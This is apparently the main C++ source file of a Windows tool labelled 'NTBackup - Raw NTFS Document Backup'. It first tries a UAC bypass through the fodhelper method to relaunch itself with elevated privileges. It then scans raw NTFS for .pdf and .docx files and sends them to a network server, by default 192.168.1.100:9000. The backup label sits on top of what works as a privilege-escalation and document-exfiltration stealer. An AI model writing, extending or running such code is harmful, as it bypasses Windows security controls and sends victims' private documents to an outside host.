// main.cpp
#include <cstdio>
#include <memory>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>

#include "core/BackupEngine.hpp"
#include "transport/StubTransport.hpp"
#include "utils/PrivilegesUtil.hpp"

int wmain(int argc, wchar_t* argv[]) {
    using namespace ntbackup;
    using namespace ntbackup::util;

    //
    // Attempt privilege elevation if not already elevated
    // Method selection and requirements are handled internally
    //
    if (!UacIsElevated()) {
        std::wprintf(L"[*] Insufficient privileges. attempting to escalate.\n");

        UAC_PARAMS params = { 0 };
        params.cbSize = sizeof(UAC_PARAMS);
        params.Method = UacMethodFodHelper;
        params.dwFlags = UAC_FLAG_NONE;
        params.dwTimeoutMs = 30000;

        //
        // Re-launch ourselves with elevation
        //
        WCHAR selfPath[MAX_PATH] = { 0 };
        if (GetModuleFileNameW(nullptr, selfPath, MAX_PATH)) {
            params.lpPayloadPath = selfPath;

            //
            // Forward command line arguments
            //
            std::wstring args;
            for (int i = 1; i < argc; i++) {
                if (i > 1) args += L" ";
                args += L"\"";
                args += argv[i];
                args += L"\"";
            }
            params.lpPayloadArgs = args.empty() ? nullptr : args.c_str();

            UAC_RESULT result = { 0 };
            ELEVATION_STATUS status = UacElevate(&params, &result);

            if (ELEVATION_SUCCEEDED(status)) {
                // std::wprintf(L"[+] Escalation successfull via %ls method.\n", 
                //             UacGetMethodName(result.MethodUsed));
                std::wprintf(L"Escalation successfull.\n");
                return 0;
            }

            WCHAR errMsg[256] = { 0 };
            UacGetStatusMessage(status, errMsg, 256);
            std::wprintf(L"[-] Elevation failed: %ls (Stage: %u, Win32: %lu)\n",
                        errMsg, result.FailureStage, result.dwWin32Error);
            std::wprintf(L"[*] Continuing without elevation...\n\n");
        }
    } else {
        std::wprintf(L"[+] Running with elevated privileges\n\n");
    }

    std::wstring serverAddress = (argc > 1) ? argv[1] : L"192.168.1.100:9000";

    std::wprintf(L"[*] NTBackup - Raw NTFS Document Backup\n");
    std::wprintf(L"[*] Server: %ls\n", serverAddress.c_str());
    std::wprintf(L"[*] Extensions: .pdf, .docx\n\n");

    core::BackupConfig config{
        .targetExtensions = {L".pdf", L".docx"},
        .verbose = true,
        .maxFileSize = 100 * 1024 * 1024
    };

    auto transport = std::make_unique<transport::StubTransport>(serverAddress);
    core::BackupEngine engine(std::move(config), std::move(transport));

    auto stats = engine.Run([](const std::wstring& currentFile,
                               const core::BackupStats& stats) {
        if (stats.filesMatched % 50 == 0) {
            std::wprintf(L"\r[*] Scanned: %llu | Matched: %llu | Sent: %llu",
                        stats.filesScanned, stats.filesMatched, stats.filesSent);
        }
    });

    std::wprintf(L"\n\n[*] Complete!\n");
    std::wprintf(L"    Files scanned:     %llu\n", stats.filesScanned);
    std::wprintf(L"    Files matched:     %llu\n", stats.filesMatched);
    std::wprintf(L"    Files sent:        %llu\n", stats.filesSent);
    std::wprintf(L"    Files failed:      %llu\n", stats.filesFailed);
    std::wprintf(L"    Bytes transferred: %llu\n", stats.bytesTransferred);

    return 0;
}